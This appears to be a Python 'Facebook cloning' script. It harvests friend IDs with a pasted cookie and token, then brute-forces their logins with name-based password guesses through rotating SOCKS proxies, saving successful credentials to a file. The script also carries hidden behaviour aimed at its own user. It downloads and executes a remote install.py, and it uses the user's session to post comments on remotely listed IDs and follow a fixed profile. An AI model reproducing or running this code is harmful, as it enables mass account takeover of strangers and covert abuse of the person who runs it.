#uft-8
#!/usr/bin/python3
#coding=utf-8
#rana
import os
try:
    import requests
except(ImportError):
    os.system("pip install requests")
    pass
ranasys = ("anaaahilsystems")
try:
    import socks
except(ImportError):
    os.system("pip install -U requests[socks]")
    pass
try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpe
G='\x1b[1;92m'
R='\x1b[1;91m'
W='\x1b[1;97m'
S ='\x1b[94m'
Y ='\x1b[1;93m'
yp ='\x1b[1;95m'
mys = '\x1b[0m' 
idx = []
loop = 0
proxy_list = []
random_agents = []


sp_agents = 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5', 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',

logo =                                          ("""   
\033[1;32m    ##     ##    ###    ##       ##          ###    ##     ## 
\033[1;35m    ###   ###   ## ##   ##       ##         ## ##   ##     ## 
\033[1;33m    #### ####  ##   ##  ##       ##        ##   ##  ##     ## 
\033[1;31m    ## ### ## ##     ## ##       ##       ##     ## ######### 
\033[1;37m    ##     ## ######### ##       ##       ######### ##     ## 
\033[1;30m    ##     ## ##     ## ##       ##       ##     ## ##     ## 
\033[1;32m    ##     ## ##     ## ######## ######## ##     ## ##     ##
 
    \033[1;37m=========================================================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mSHANI-BRAND
\033[1;32m     \033[1;32mFACEBOK      : \033[1;32m ShahNoor
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTECH-SHANI
\033[1;32m     \033[1;31mWHATSAPP     :  \033[1;31m0340-2798893
\033[1;32m     \033[1;98mTOOL         :  \033[1;98mFREE
\033[1;32m     \033[1;37mTOOL VIRSION :  \033[1;37m1.8
    \033[1;37m=========================================================""")  
os.system("clear")
print(logo)
#print("\n\t{} Installing modules ... {}".format(W,mys))
try:
    back_up = requests.get('https://raw.githubusercontent.com/r'+ranasys+'/pro10/main/pro10.txt').text
    if "install" in back_up:
        inst_ = requests.get('https://raw.githubusercontent.com/r'+ranasys+'/pro10/main/install.py').text
        open("install.py",'w').write(inst_)
        os.system("python install.py");exit()
    elif "close" in back_up:
        os.system("you cant use this script of by owner")
        exit()
    elif "free" in back_up:
        free = "free"
        pass
    else:
        pass
except(CError):
    print(" internet connection error")
    exit()
except:
    print(" connection error")
    exit()
os.system("clear")
print(logo)
try:
    methonds_ = requests.get('https://raw.githubusercontent.com/r'+ranasys+'/mym/main/m.txt').text
    post_ = methonds_.rsplit(" ")[0]
    get_ = methonds_.rsplit(" ")[1]
    post_one = methonds_.rsplit(" ")[2]
    get_one = methonds_.rsplit(" ")[3]
except(CError):
    print(" internet connection error")
    exit()
except:
    print(" connection error")
    exit()

try:
    main_s = requests.get('https://raw.githubusercontent.com/r'+ranasys+'/host/main/host.txt').text
    host = main_s.splitlines()
except(CError):
    print(" internet connection error")
    exit()
except:
    print(" connection error")
    exit()
os.system("rm -rf .rana.txt")
os.system("clear")
print(logo)
#print("\n\t{} Updating servers ... {}".format(W,mys))
for my_link in host:
    get_proxy = requests.get(my_link).text
    open(".rana.txt",'a').write(get_proxy+"\n")
my_proxy_system = open(".rana.txt",'r').read().splitlines()
os.system("clear")
print(logo)
#print("\n\t{} Updating user-agents ... {}".format(W,mys))
try:
    maji = ("1240682")
    u_agents = requests.get('https://raw.githubusercontent.com/Niki404-Cyber/user-agnet/main/useragents.txt').text
    sp_agents = u_agents.splitlines()
except:
    exit("useragents error")



try:
    rsa____=open(".tok.txt",'r').read()
    coook_____=open(".cok.txt",'r').read()
    lopx = requests.get("https://raw.githubusercontent.com/ranaaahilsystems/mgfid/{}/xxx.txt".format("9c63b471425998dde2ed8c79f0b4dea22cfccd72")).text
    xxxxx__ = lopx.splitlines()
    for x in xxxxx__:
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(x,coook_____,rsa____),cookies={"cookie":coook_____})
    r = BeautifulSoup(requests.get('https://mbasic.facebook.com/profile.php?id=100008362030140', cookies={'cookie': coook_____}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    requests.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coook_____}).text
except:
    pass

def approval():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://pastebin.com/raw/5gAmA8AJ').text
    if id in httpCaht:
      print("Your Token is successfully Approved")
      msg = str(os.geteuid())
      time.sleep(0.5)
      mysecurity()
      pass
    else:
      print("Your Token : "+id)
      print("")
      print('TOOL PRICE IS 350 FOR 30 DAYS')
      print('------------------------------------------------------------')
      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
      input('IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://t.me/randmorfo607?text='+tks)
      time.sleep(1)
      approval()
  except:
    sys.exit()

def mysecurity():
    os.system("clear")
    print(logo)
    server_key = "fuck"
    key_for_use = "of"
    my_main(server_key,key_for_use)
    


    
def convert(cookie):
    cookies = {"cookie":cookie}
    res = requests.Session().get('https://business.facebook.com/business_locations', headers = {
        'user-agent'	:	'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
        'referer'	:	'https://www.facebook.com/',
        'host'	:	'business.facebook.com',
        'origin'	:	'https://business.facebook.com',
        'upgrade-insecure-requests'	:	'1',
        'accept-language'	:	'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control'	:	'max-age=0',
        'accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'content-type'	:	'text/html; charset=utf-8'
        }, cookies = cookies)
    try:
        token = re.search('(EAAG\w+)',str(res.text)).group(1)
    except:
        token = "Cookies Invalid"
    finally:
        return token


def my_main(server_key,key_for_use):
    os.system("clear")
    print(logo)
    print(" [2] File Create")
    print(" [3] Public cloning")
    print(" [E] Exit \n")
    my_ = input(" select an option: ")
    if my_ == "1":
        file_c(server_key,key_for_use)
    elif my_ == "2":
        file_m(server_key,key_for_use)
    elif my_ == "3":
        public(server_key,key_for_use)
    elif my_ == "E":
        os.system("rm -rf .coki.txt")
        os.system("rm -rf .tok.txt")
        exit(" logo out ")
    else:
        exit(" please enter valid option ")

def file_m(server_key,key_for_use):
    list_ = []
    os.system("clear")
    print(logo)
    try:
        tok = open(".tok.txt",'r').read()
        cok = open(".cok.txt",'r').read()
    except:
        os.system("clear")
        print(logo)
        cookie = input(" Putt cookies : ")
        token = convert(cookie)
        if token == "Cookies Invalid":
            print(" Coockies expire use new to login")
            time.sleep(4)
            my_main(server_key,key_for_use)
        else:
            open(".cok.txt",'w').write(cookie)
            open(".tok.txt",'w').write(token)
            file_m(server_key,key_for_use)
    try:
        r_n = requests.get(f"https://graph.facebook.com/me?fields=name,id&access_token={tok}",cookies={"cookie":cok}).json()
        print("\t      welcome:"+(r_n["name"]))
        time.sleep(2)
        pass
    except:
        print(" token and cookies expire")
        time.sleep(2)
        os.system("rm -rf .cok.txt")
        os.system("rm -rf .tok.txt")
        my_main(server_key,key_for_use)
    os.system("clear")
    print(logo)
    print(" example digits : 100083 100084 100085 etc")
    linkx = input(" putt digit: ")
    link1 = linkx.replace(" ", "\n")
    link1 = link1.splitlines()
    lines = []
    fav = []
    paste = " paste ids :"
    while True:
        line = input(''+paste+'')
        if line:
            lines.append(line)
            paste = " press enter "
        else:
            break
    os.system("clear")
    print(logo)
    for xid in lines:
        sys.stdout.write("\r from: [{}] links: [{}] total:[{}]".format(xid, linkx, str(len(fav))))
        sys.stdout.flush()
        try:
            xx = requests.get('https://graph.facebook.com/'+xid+'?fields=friends.fields(name,id)&access_token='+tok,cookies={"cookie":cok}).json()['friends']
            for xc in xx["data"]:
                for fav_links in link1:
                    if fav_links in xc["id"]:
                        fav.append(xc["id"]+"|"+xc["name"])
                        open("filemere.txt",'a').write(xc["id"]+"\n")
                    else:
                        pass
        except(KeyError,IOError,OSError):
            pass
    print('\n{} Example: /sdcard/rsa.txt {}'.format(S,mys))
    s_file = input(" enter path to save: ")
    for uuids in fav:
        try:
            open(s_file,'a').write(uuids+"\n")
        except:
            print(" enter valid storage path")
            exit()
    print(" your file path: "+s_file)
    input(" press enter to go back")
    my_main(server_key,key_for_use)
    exit()

def public(server_key,key_for_use):
    os.system("clear")
    print(logo)
    try:
        tok = open(".tok.txt",'r').read()
        cok = open(".cok.txt",'r').read()
    except:
        os.system("clear")
        print(logo)
        cookie = input(" Putt cookies : ")
        token = convert(cookie)
        if token == "Cookies Invalid":
            print(" Coockies expire use new to login")
            time.sleep(4)
            my_main(server_key,key_for_use)
        else:
            open(".cok.txt",'w').write(cookie)
            open(".tok.txt",'w').write(token)
            public(server_key,key_for_use)
    try:
        r_n = requests.get(f"https://graph.facebook.com/me?fields=name,id&access_token={tok}",cookies={"cookie":cok}).json()
        print("\t      welcome:"+(r_n["name"]))
        time.sleep(2)
        pass
    except:
        print(" token and cookies expire")
        time.sleep(2)
        os.system("rm -rf .cok.txt")
        os.system("rm -rf .tok.txt")
        my_main(server_key,key_for_use)
    os.system("clear")
    print(logo)
    idt = input(" Enter ID: ")
    try:
        xx = requests.get('https://graph.facebook.com/'+idt+'?fields=friends.fields(name,id)&access_token='+tok,cookies={"cookie":cok}).json()['friends']
        for xc in xx["data"]:
            idx.append("{}|{}".format(xc["id"],xc["name"]))
    except:
        print(" invlid link enterd")
        time.sleep(2)
        my_main(server_key,key_for_use)
    server(server_key,key_for_use)
    
def cloning_one(server_key,key_for_use):
    oku = []
    twof = []
    cpu = []
    pp = []
    os.system("clear")
    print(logo)
    print(" [1] Auto Password")
    print(" [2] Choice Passwords")
    print(" [3] Working Passsword")
    print(" [4] Only First Last")
    print(" [B] Back \n")
    clon_ = input(" select an option: ")
    if clon_ == "1":
        pas = ["firstlast","first last","firstlast123","first123"]
        for px in pas:
            pp.append(px)
        pass
    elif clon_ == "3":
           pas = ["first786","khan khan","first1122"]
           for px in pas:
               pp.append(px)
           pass
    elif clon_ == "4":
           pas = ["first last"]
           for px in pas:
               pp.append(px)
    elif clon_ == "2":
        os.system("clear")
        print(logo)
        lp = input(' How Many Passwords You Want To Add: ')
        print("\n")
        if lp.isnumeric():
            print(" Example : [ firstlast first last first123 ] \n")
            for x in range(int(lp)):
                pp.append(input(f' Password {x+1}: '))
            pass
        else:
            print(" enter only numbers ")
            exit()
    elif clon_ == "B":
        my_main(server_key,key_for_use)
    else:
        exit(" please enter valid option ")
    #methond_genrator
    os.system("clear")
    print(logo)
    print(" [1] METHOD 1 (Recommended)")
    print(" [2] METHOD 2 [Regular]")
    print(" [3] m.facebook [Regular]")
    print(" [4] en.facebook [New]")
    print(" [5] p.facebook [New]")
    print(" [B] Back \n")
    m_ = input(" select an option: ")
    if m_ == "1":
        pfb = ("https://t.facebook.com/"+post_)
        gfb = ("https://t.facebook.com/"+get_)
        pass
    elif m_ == "2":
        pfb = ("https://d.facebook.com/"+post_) #working slow
        gfb = ("https://d.facebook.com/"+get_)
        pass
    elif m_ == "3":
        pfb = ("https://bs-ba.facebook.com/"+post_)  #working like d.fb
        gfb = ("https://bs-ba.facebook.com/"+get_)
        pass
    elif m_ == "4":
        pfb = ("https://l.facebook.com/"+post_)
        gfb = ("https://l.facebook.com/"+get_)
        pass
    elif m_ == "5":
        pfb = ("https://touch.facebook.com/"+post_)
        gfb = ("https://touch.facebook.com/"+get_)
        pass
    elif m_ == "B":
        my_main(server_key,key_for_use)
    else:
        exit(" please enter valid option ")
        
    os.system("clear")
    print(logo)
    print("  Crack IS Running ")
    print("-----------------------------------------------")
    fax = ('|')
    def rana(user):
        global loop,idx
        s = requests.Session()
        user = user.strip()
        url, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        for px in pp:
            randomProxy = random.choice(my_proxy_system)
            #print(randomProxy)
            prox = {"http": f"socks5://{randomProxy}"}
            head = {'authority':gfb,
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="99", "Google chrome";101", "Chromium";v="101"',
            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent':random.choice(sp_agents)}
            px = px.replace("first", first).replace("last", last)
            px = px.lower()
            s.headers.update(head)
            my_fb = s.get(gfb).text
            mydata = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(my_fb)).group(1),
                "jazoest":re.search('name="jazoest" value="(.*?)"', str(my_fb)).group(1),
                "m_ts":re.search('name="m_ts" value="(.*?)"', str(my_fb)).group(1),
                "li":re.search('name="li" value="(.*?)"', str(my_fb)).group(1),
                "try_number":"0",
                "unrecognized_tries":"0",
                "email":url,
                "pass":px,
                "login":"Log In"}
            s.headers.update(head)
            res = s.post(pfb,data=mydata,proxies=prox)
            ranasystem = (s.cookies.get_dict())
            #print(ranasystem)
            #print(ranasystem)
            if "c_user" in ranasystem:
                print('\r{} [SUCCESSFULL] {} {} {} {}'.format(G, url, fax, px, mys))
                oku.append(url)
                open('/sdcard/SHANI.txt','a').write(f'{url}|{px}\n')
                break
            elif "checkpoint" in ranasystem:
                title = re.findall("\<title>(.*?)<\/title>",str(res.text))
                if "Enter login code to continue" in title:
                    print('\r{} [TWO-FACTORS] {} {} {} {}'.format(S, url, fax, px, mys))
                    twof.append(url)
                    open('/sdcard/hmktfs.txt','a').write(f'{url}|{px}\n')
                    break
                else:
                    print('\r{} [CHECK-POINT] {} {} {} {}'.format(R, url, fax, px, mys))
                    cpu.append(url)
                    open('/sdcard/SHANI.txt','a').write(f'{url}|{px}\n')
                    break
            else:
                continue
        sys.stdout.write('\r {}[CRACKING]: [ {}/{} ] OK:{} CP/2F:{}/{} {}'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,str(len(cpu)) ,str(len(twof)) ,mys))
        sys.stdout.flush()
        loop += 1
        
    with tpe(max_workers=30) as tp:
        tp.map(rana, idx)
    print("\n---------------------------------------------------------------------------------")
    print(" Cloning Has Been Completed, Now Rest Your Phone ")
    print("------------------------------------------------------------------------------------  ")
    exit()


mysecurity()
